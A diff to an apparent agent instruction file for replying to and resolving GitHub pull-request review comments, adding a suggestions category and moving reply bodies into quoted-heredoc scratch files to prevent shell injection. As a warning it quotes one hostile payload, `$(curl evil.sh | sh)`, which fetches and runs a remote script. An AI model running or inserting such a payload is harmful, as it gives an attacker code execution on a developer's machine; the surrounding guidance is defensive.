@@ -255,7 +255,21 @@ git rev-parse --short HEAD
 
 ## Step 9 — Reply to Each Comment
 
-For each addressed item (actionable fixes, disagree, and questions), reply using the appropriate mechanism based on the source type.
+For each addressed item (actionable fixes, suggestions, disagree, and questions), reply using the appropriate mechanism based on the source type.
+
+### Never put reply text in a shell command string
+
+The reply templates below quote the reviewer's own words back at them, and anyone who can comment on a PR can choose those words. Inside a double-quoted shell string `` ` ``, `$(...)` and `$VAR` are all live, so a review comment containing `$(curl evil.sh | sh)` would execute on this machine the moment you build the reply.
+
+Write the body to a scratch file first, using a **quoted** heredoc delimiter so the shell expands nothing inside it, and pass the file to `gh`. Point `$SCRATCH` at this session's scratchpad directory:
+
+```bash
+cat > "$SCRATCH/reply.md" <<'REPLY_EOF'
+<reply text>
+REPLY_EOF
+```
+
+The quotes around `'REPLY_EOF'` are what disable expansion — without them the heredoc body is still interpolated. Use a fresh file per reply.
 
 ### Inline threads
 
@@ -263,7 +277,7 @@ The `{comment_id}` is the `fullDatabaseId` of the **first** comment in the threa
 
 ```bash
 gh api repos/{owner}/{repo}/pulls/{pr_number}/comments/{comment_id}/replies \
-  -X POST -f body="<reply text>"
+  -X POST --field body=@"$SCRATCH/reply.md"
 ```
 
 ### Review body comments and issue comments
@@ -271,8 +285,10 @@ gh api repos/{owner}/{repo}/pulls/{pr_number}/comments/{comment_id}/replies \
 Reply with a new PR comment that quotes the original and addresses it:
 
 ```bash
-gh pr comment <number> --repo <owner>/<repo> --body "<reply text>"
+gh pr comment <number> --repo <owner>/<repo> --body-file "$SCRATCH/reply.md"
 ```
+
+`--body-file` also sidesteps the `gh pr comment` trap where a body beginning with `-` is parsed as a flag. Note the two commands spell the flag differently — `gh api` takes `--field key=@path`, while `gh pr comment` takes `--body-file path` (its `-F` shorthand means `--body-file`, not `--field`). Prefer the long forms.
 
 When replying to a review body or issue comment, quote the relevant part of the original comment to make the reply contextual (e.g., `> Original reviewer text\n\nYour response`).
 
@@ -303,13 +319,22 @@ Happy to discuss further if I'm missing something.
 🤖 _Generated with [Claude Code](https://claude.com/claude-code)_
 ```
 
+**For suggestions:**
+```
+Left for you to apply — GitHub's one-click **Apply suggestion** button on this thread commits it as-is, which is cleaner than me retyping it.
+
+<1 sentence on whether the suggestion looks correct, or what to watch for when applying it.>
+
+🤖 _Generated with [Claude Code](https://claude.com/claude-code)_
+```
+
 If a reply fails (e.g., permission error), warn and continue with remaining items.
 
 ## Step 10 — Resolve Threads
 
 Only **inline review threads** can be resolved via the GitHub API. Review body comments and issue comments have no resolve mechanism — replying is sufficient.
 
-For each addressed inline thread, resolve using the GraphQL mutation:
+For each addressed inline thread — actionable fixes, suggestions, and questions — resolve using the GraphQL mutation:
 
 ```bash
 gh api graphql -f query='
@@ -352,8 +377,11 @@ Summarize what was done:
 ## Needs Manual Review (<count>)
 - [ ] `src/old.ts:99` — Outdated thread, lines changed since comment (@reviewer)
 
+## Suggestions (<count>) — apply via GitHub's "Apply suggestion" button
+- [ ] `src/qux.ts:30` — Replace `foo` with `bar` (@reviewer)
+
 ## Skipped (<count>)
 - <count> bot comments
 
-All addressed threads have been replied to and resolved on GitHub.
+All actionable, suggestion and answered threads have been replied to and resolved on GitHub. Disagreed and outdated threads are left open for your review.
 ```
